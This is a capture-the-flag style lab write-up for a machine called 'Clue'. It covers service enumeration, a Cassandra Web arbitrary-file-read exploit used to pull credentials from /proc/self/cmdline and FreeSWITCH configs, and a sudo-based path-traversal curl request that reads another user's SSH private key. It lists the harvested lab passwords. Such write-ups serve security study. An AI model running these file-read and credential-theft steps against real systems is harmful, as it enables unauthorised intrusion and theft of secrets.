# Clue \[Hard]

## Report

Cassandra and Freeswitch are two services running whose source files are available via 'backup' SMB share. A file read exploit exists for the former where we extract creds for 'cassie' by reading `/proc/self/cmdline` . An authenticated RCE exploit exists which requires us to extract creds from Freeswitch using the Cassandra exploit after a few Google searches.&#x20;

Cassie can run Cassandra as sudo, remember we already exploited file read via this service, now as sudo we will have system-wide access. Read user 'anthony' SSH key and bash\_history which indicates it is the same as root SSH key.

## Loot

### Enumeration

192.168.106.240

```
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  0a�▒�U           Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: thin
|_http-title: Cassandra Web
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-10-02T10:13:07
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2025-10-02T06:13:10-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m40s, deviation: 2h18m36s, median: 39s

```

#### 80

```
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
backup - 403
```

#### 3000 (Cassandra)

```
Cassandra::Errors::UnauthorizedError: User cassie has no SELECT permission on <table system_traces.sessions> or any of its parents
3.11.13

./usr/share/doc/cassandra/CQL.html
 alice:password_a OR alice:PASSWORD_A
```

#### 8021 (Freeswitch)

```
freeswitch/etc/freeswitch/directory
./brian.xml:      <!--<param name="password" value="2007"/>--> 
./brian.xml:      <param name="vm-password" value="9999"/><!--if vm-password is omitted password param is used-->

┌──(jtripz㉿kali)-[~/…/freeswitch/etc/freeswitch/autoload_configs]
└─$ cat event_socket.conf.xml 
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="::"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="ClueCon"/>
```

### Attack Vectors

Cassandra 0.5 Arbitrary File Read, use it to read FreeSwitch creds too

```
python3 49362.py 192.168.106.240 /etc/passwd 

cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash

python3 49362.py 192.168.106.240 /proc/self/cmdline
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330


python 49362.py 192.168.106.240 ../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
<param name="password" value="StrongClueConEight021"/>
```

### PrivEsc

```
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                                                                           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9042          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8021            0.0.0.0:*               LISTEN      544/freeswitch      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:7000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43711         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:7199          0.0.0.0:*               LISTEN      -   
```

```
Cassie
sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
Only listens on localhost 
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      -   
ctrl+Z
bg

curl --path-as-is http://127.0.0.1:4444/../../../../../../../../home/anthony/.bash_history
clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys

curl --path-as-is http://127.0.0.1:4444/../../../../../../../../home/anthony/.ssh/id_rsa
```

### Creds

`cassie:SecondBiteTheApple330`

`freeswitch:StrongClueConEight021`

### Proof

* If a service is running, we can intercept the command used to start the service in `/proc/self/cmdline`
* Shoot those exploits even though you don't know the version of the service running
* Read your exploits see what they doin you get a lot of good hints
* Suspend a process and run it in background using `bg`
* Seeing you can run a command via sudo doesn't mean no args allowed try it out first twin
